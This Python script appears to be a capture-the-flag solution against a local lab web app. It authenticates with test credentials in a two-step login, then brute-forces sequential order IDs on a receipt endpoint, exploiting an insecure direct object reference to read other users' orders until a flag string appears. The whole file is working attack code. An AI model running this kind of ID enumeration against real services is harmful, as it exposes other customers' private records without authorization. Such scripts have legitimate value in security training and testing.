import requests
import re
import time

# Target base URL
BASE_URL = "http://127.0.0.1:32780"

# Initialize session for connection reuse
session = requests.Session()

print("[*] Starting authentication process...")

# Step 1: Initial username submission
try:
    auth_step1 = session.post(
        f"{BASE_URL}/",
        data={"username": "test"},
        allow_redirects=True
    )
    print(f"[+] Step 1 - Username submission: Status {auth_step1.status_code}")
    if auth_step1.cookies:
        print(f"[+] Cookies received: {dict(auth_step1.cookies)}")
except Exception as e:
    print(f"[-] Step 1 failed: {e}")
    exit(1)

# Step 2: Password submission with user_id
try:
    auth_step2 = session.post(
        f"{BASE_URL}/password/test",
        data={
            "username": "test",
            "user_id": "10032",
            "password": "test"
        },
        allow_redirects=True
    )
    print(f"[+] Step 2 - Password submission: Status {auth_step2.status_code}")
    if auth_step2.cookies:
        print(f"[+] Session cookies: {dict(session.cookies)}")
    print("[+] Authentication completed successfully\n")
except Exception as e:
    print(f"[-] Step 2 failed: {e}")
    exit(1)

# Step 3: Fuzz order_id range
print("[*] Starting order_id fuzzing (300000-300500)...")
print("[*] Testing range: 300000 to 300500 (501 IDs)\n")

valid_orders = []
flag_found = False
flag_value = None
flag_order_id = None

start_time = time.time()

for order_id in range(300000, 300501):
    try:
        # GET request to order receipt endpoint
        response = session.get(
            f"{BASE_URL}/order/{order_id}/receipt",
            allow_redirects=False
        )
        
        # Check for FLAG pattern in response
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        
        if flag_match:
            flag_value = flag_match.group(0)
            flag_order_id = order_id
            flag_found = True
            print(f"\n{'='*80}")
            print(f"[!!!] FLAG FOUND at order_id={order_id}")
            print(f"[!!!] FLAG: {flag_value}")
            print(f"{'='*80}\n")
            print(f"[+] Full response from order {order_id}:")
            print(f"Status: {response.status_code}")
            print(f"Content-Length: {len(response.text)}B")
            print(f"Response:\n{response.text}\n")
            valid_orders.append(order_id)
            break  # Stop immediately when flag is found
        
        # Check if order exists (non-empty content, successful status)
        if response.status_code == 200 and len(response.text.strip()) > 0:
            valid_orders.append(order_id)
            print(f"[+] Valid order found: {order_id} | Status: {response.status_code} | Length: {len(response.text)}B")
            # Print a snippet to see what valid orders look like
            snippet = response.text[:200].replace('\n', ' ')
            print(f"    Preview: {snippet}...")
        
        # Progress indicator every 50 IDs
        if (order_id - 300000 + 1) % 50 == 0:
            elapsed = time.time() - start_time
            tested = order_id - 300000 + 1
            print(f"[*] Progress: {tested}/501 tested ({tested/501*100:.1f}%) | Elapsed: {elapsed:.1f}s | Valid: {len(valid_orders)}")
        
    except Exception as e:
        print(f"[-] Error testing order_id {order_id}: {e}")
        continue

end_time = time.time()
total_time = end_time - start_time

# Summary
print(f"\n{'='*80}")
print("[*] FUZZING SUMMARY")
print(f"{'='*80}")
print(f"Range tested: 300000-300500 (501 IDs)")
print(f"Total time: {total_time:.2f}s")
print(f"Average time per request: {total_time/501:.3f}s")
print(f"Valid orders found: {len(valid_orders)}")

if valid_orders:
    print(f"\nValid order_ids: {valid_orders}")

if flag_found:
    print(f"\n[SUCCESS] FLAG EXTRACTED:")
    print(f"  Order ID: {flag_order_id}")
    print(f"  FLAG: {flag_value}")
else:
    print(f"\n[INFO] No FLAG pattern found in tested range")

print(f"{'='*80}")

